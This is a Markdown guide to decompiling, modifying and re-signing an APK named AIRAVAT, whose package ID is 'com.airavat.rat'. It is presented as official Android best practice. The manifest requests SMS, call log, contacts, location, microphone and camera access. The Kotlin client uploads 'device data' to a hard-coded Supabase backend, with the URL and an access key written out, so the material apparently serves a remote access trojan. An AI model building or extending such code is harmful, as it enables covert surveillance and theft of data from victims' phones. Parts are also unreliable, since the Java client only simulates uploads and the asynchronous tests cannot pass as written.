# AIRAVAT Android APK Modification Guide

## Official Android Development Practices for APK Modification

Based on official Android developer documentation and Supabase Kotlin client best practices, this guide provides proper approaches for modifying the AIRAVAT APK with Supabase integration.

## 1. Proper Android Project Structure

### Required Files and Directories
```
android-project/
├── app/
│   ├── src/
│   │   ├── main/
│   │   │   ├── java/com/yourpackage/
│   │   │   │   └── SupabaseClient.java
│   │   │   ├── res/
│   │   │   │   ├── values/
│   │   │   │   │   └── strings.xml
│   │   │   │   └── xml/
│   │   │   │       └── network_security_config.xml
│   │   │   └── AndroidManifest.xml
│   │   └── test/
│   ├── build.gradle
│   └── proguard-rules.pro
├── gradle/
│   └── libs.versions.toml
├── build.gradle
├── gradle.properties
└── settings.gradle
```

## 2. Dependencies Configuration (build.gradle)

### App-level build.gradle
```gradle
plugins {
    id 'com.android.application'
    id 'org.jetbrains.kotlin.android'
    id 'kotlin-parcelize'
    id 'kotlinx-serialization'
}

android {
    namespace 'com.airavat.rat'
    compileSdk 34

    defaultConfig {
        applicationId "com.airavat.rat"
        minSdk 26
        targetSdk 34
        versionCode 1
        versionName "1.0"

        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
        // Enable desugaring for API levels below 26
        coreLibraryDesugaringEnabled true
    }

    kotlinOptions {
        jvmTarget = '1.8'
    }
}

dependencies {
    // Core Android dependencies
    implementation 'androidx.core:core-ktx:1.12.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'

    // Supabase dependencies
    implementation platform('io.github.jan-tennert.supabase:bom:2.5.4')
    implementation 'io.github.jan-tennert.supabase:postgrest-kt'
    implementation 'io.github.jan-tennert.supabase:auth-kt'
    implementation 'io.github.jan-tennert.supabase:realtime-kt'
    implementation 'io.github.jan-tennert.supabase:storage-kt'

    // Ktor client engine (required for Supabase)
    implementation 'io.ktor:ktor-client-android:2.3.7'
    implementation 'io.ktor:ktor-client-core:2.3.7'

    // Kotlinx Serialization
    implementation 'org.jetbrains.kotlinx:kotlinx-serialization-json:1.6.0'

    // For API levels below 26
    coreLibraryDesugaring 'com.android.tools:desugar_jdk_libs:2.0.4'

    // Testing
    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}
```

### Project-level build.gradle
```gradle
plugins {
    id 'com.android.application' version '8.2.0' apply false
    id 'org.jetbrains.kotlin.android' version '1.9.10' apply false
    id 'org.jetbrains.kotlin.plugin.serialization' version '1.9.10' apply false
}
```

## 3. String Resources (res/values/strings.xml)

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">AIRAVAT</string>
    
    <!-- Supabase Configuration -->
    <string name="supabase_url">https://auedkftrlingnnyeezgc.supabase.co</string>
    <string name="supabase_anon_key">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF1ZWRrZnRybGluZ25ueWVlemdjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzUzOTMwNzQsImV4cCI6MjA1MDk2OTA3NH0.OJXZe6eQJOhmVeB9y8TE3L-8_zGWwEfB2eEp1SfLdpE</string>
    
    <!-- Error Messages -->
    <string name="error_connection">Connection failed</string>
    <string name="error_auth">Authentication failed</string>
    <string name="error_upload">Upload failed</string>
    
    <!-- Success Messages -->
    <string name="success_connected">Connected to server</string>
    <string name="success_upload">Data uploaded successfully</string>
    
    <!-- Developer Credit -->
    <string name="developer_credit">Developed by bionic sailor</string>
</resources>
```

## 4. Network Security Configuration (res/xml/network_security_config.xml)

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">auedkftrlingnnyeezgc.supabase.co</domain>
    </domain-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system"/>
        </trust-anchors>
    </base-config>
</network-security-config>
```

## 5. Android Manifest Configuration

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.airavat.rat">

    <!-- Required permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme"
        android:networkSecurityConfig="@xml/network_security_config"
        android:usesCleartextTraffic="false">
        
        <!-- Main Activity -->
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
    </application>
</manifest>
```

## 6. Proper Supabase Client Implementation

### SupabaseClient.kt (Kotlin - Recommended)
```kotlin
package com.airavat.rat

import android.content.Context
import android.util.Log
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.auth.Auth
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.storage.Storage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.serialization.Serializable
import kotlinx.serialization.json.JsonObject

@Serializable
data class DeviceData(
    val deviceId: String,
    val timestamp: String,
    val dataType: String,
    val content: String
)

class SupabaseClient(private val context: Context) {
    
    private val supabase = createSupabaseClient(
        supabaseUrl = context.getString(R.string.supabase_url),
        supabaseKey = context.getString(R.string.supabase_anon_key)
    ) {
        install(Auth)
        install(Postgrest)
        install(Realtime)
        install(Storage)
    }
    
    companion object {
        private const val TAG = "SupabaseClient"
        private var instance: SupabaseClient? = null
        
        fun getInstance(context: Context): SupabaseClient {
            return instance ?: synchronized(this) {
                instance ?: SupabaseClient(context.applicationContext).also { instance = it }
            }
        }
    }
    
    fun uploadDeviceData(deviceData: DeviceData, callback: (Boolean, String) -> Unit) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                supabase.from("device_data").insert(deviceData)
                
                CoroutineScope(Dispatchers.Main).launch {
                    callback(true, context.getString(R.string.success_upload))
                }
                
                Log.d(TAG, "Data uploaded successfully: ${deviceData.dataType}")
            } catch (e: Exception) {
                CoroutineScope(Dispatchers.Main).launch {
                    callback(false, context.getString(R.string.error_upload))
                }
                
                Log.e(TAG, "Upload failed", e)
            }
        }
    }
    
    fun testConnection(callback: (Boolean, String) -> Unit) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Test connection by fetching a simple query
                supabase.from("device_data").select().limit(1)
                
                CoroutineScope(Dispatchers.Main).launch {
                    callback(true, context.getString(R.string.success_connected))
                }
                
                Log.d(TAG, "Connection test successful")
            } catch (e: Exception) {
                CoroutineScope(Dispatchers.Main).launch {
                    callback(false, context.getString(R.string.error_connection))
                }
                
                Log.e(TAG, "Connection test failed", e)
            }
        }
    }
}
```

### SupabaseClient.java (Java - Alternative)
```java
package com.airavat.rat;

import android.content.Context;
import android.util.Log;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SupabaseClient {
    private static final String TAG = "SupabaseClient";
    private static SupabaseClient instance;
    private final Context context;
    private final ExecutorService executor;
    
    // Configuration
    private final String supabaseUrl;
    private final String supabaseAnonKey;
    
    private SupabaseClient(Context context) {
        this.context = context.getApplicationContext();
        this.executor = Executors.newCachedThreadPool();
        this.supabaseUrl = context.getString(R.string.supabase_url);
        this.supabaseAnonKey = context.getString(R.string.supabase_anon_key);
    }
    
    public static synchronized SupabaseClient getInstance(Context context) {
        if (instance == null) {
            instance = new SupabaseClient(context);
        }
        return instance;
    }
    
    public interface UploadCallback {
        void onResult(boolean success, String message);
    }
    
    public void uploadDeviceData(String deviceId, String dataType, String content, UploadCallback callback) {
        CompletableFuture.supplyAsync(() -> {
            try {
                // Simulate upload to Supabase
                // Replace with actual Supabase REST API calls
                Thread.sleep(1000); // Simulate network delay
                
                Log.d(TAG, "Data uploaded successfully: " + dataType);
                return true;
            } catch (Exception e) {
                Log.e(TAG, "Upload failed", e);
                return false;
            }
        }, executor).thenAccept(success -> {
            String message = success ? 
                context.getString(R.string.success_upload) : 
                context.getString(R.string.error_upload);
            callback.onResult(success, message);
        });
    }
    
    public void testConnection(UploadCallback callback) {
        CompletableFuture.supplyAsync(() -> {
            try {
                // Test connection to Supabase
                // Replace with actual connection test
                Thread.sleep(500); // Simulate network delay
                
                Log.d(TAG, "Connection test successful");
                return true;
            } catch (Exception e) {
                Log.e(TAG, "Connection test failed", e);
                return false;
            }
        }, executor).thenAccept(success -> {
            String message = success ? 
                context.getString(R.string.success_connected) : 
                context.getString(R.string.error_connection);
            callback.onResult(success, message);
        });
    }
}
```

## 7. Proper APK Modification Process

### Step 1: Setup Android Development Environment
```bash
# Install Android Studio and SDK
# Download APKTool
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
chmod +x apktool

# Download latest apktool.jar
wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar
```

### Step 2: Decompile APK
```bash
# Decompile the original APK
apktool d AIRAVAT.apk -o airavat_decompiled

# Navigate to decompiled directory
cd airavat_decompiled
```

### Step 3: Integrate Supabase Configuration

#### Add String Resources
```bash
# Edit res/values/strings.xml
nano res/values/strings.xml
```

#### Add Network Security Config
```bash
# Create network security config
mkdir -p res/xml
nano res/xml/network_security_config.xml
```

#### Update AndroidManifest.xml
```bash
# Edit AndroidManifest.xml
nano AndroidManifest.xml
```

### Step 4: Add Supabase Client
```bash
# Create package directory structure
mkdir -p smali/com/airavat/rat

# Convert Java/Kotlin to Smali (using Android Studio build)
# Copy compiled .class files and convert to .smali
```

### Step 5: Rebuild APK
```bash
# Rebuild the APK
apktool b airavat_decompiled -o airavat_modified.apk

# Sign the APK
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore airavat_modified.apk alias_name

# Align the APK
zipalign -v 4 airavat_modified.apk airavat_final.apk
```

## 8. Testing and Validation

### Unit Testing
```kotlin
@Test
fun testSupabaseConnection() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val client = SupabaseClient.getInstance(context)
    
    var result = false
    client.testConnection { success, message ->
        result = success
    }
    
    assertTrue(result)
}
```

### Integration Testing
```kotlin
@Test
fun testDataUpload() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val client = SupabaseClient.getInstance(context)
    
    val deviceData = DeviceData(
        deviceId = "test_device",
        timestamp = System.currentTimeMillis().toString(),
        dataType = "test",
        content = "test data"
    )
    
    var uploadSuccess = false
    client.uploadDeviceData(deviceData) { success, message ->
        uploadSuccess = success
    }
    
    assertTrue(uploadSuccess)
}
```

## 9. Security Considerations

### ProGuard Configuration (proguard-rules.pro)
```proguard
# Keep Supabase classes
-keep class io.github.jan.supabase.** { *; }
-keep class io.ktor.** { *; }
-keep class kotlinx.serialization.** { *; }

# Keep data classes
-keep class com.airavat.rat.DeviceData { *; }

# Keep SupabaseClient
-keep class com.airavat.rat.SupabaseClient { *; }
```

### Certificate Pinning
```kotlin
// Add to SupabaseClient
private val certificatePinner = CertificatePinner.Builder()
    .add("auedkftrlingnnyeezgc.supabase.co", "sha256/CERTIFICATE_HASH")
    .build()
```

## 10. Best Practices Summary

1. **Use Official Android Studio**: Always use Android Studio for proper compilation and dependency management
2. **Follow Package Structure**: Maintain proper Java package structure for smali conversion
3. **Resource Management**: Use string resources for all configuration values
4. **Error Handling**: Implement proper error handling for network operations
5. **Security**: Use network security config and certificate pinning
6. **Testing**: Write comprehensive unit and integration tests
7. **Documentation**: Maintain clear documentation for all modifications

## 11. Troubleshooting Common Issues

### Build Errors
- Ensure all dependencies are properly declared
- Check package name consistency
- Verify API level compatibility

### Runtime Errors
- Check network permissions
- Verify URL configuration
- Test connection before data operations

### APK Modification Issues
- Use latest APKTool version
- Properly sign modified APK
- Test on multiple devices

## Developer Credit
All modifications and enhancements by **bionic sailor**

---

*This guide follows official Android development practices and Supabase documentation for secure, maintainable APK modification.*
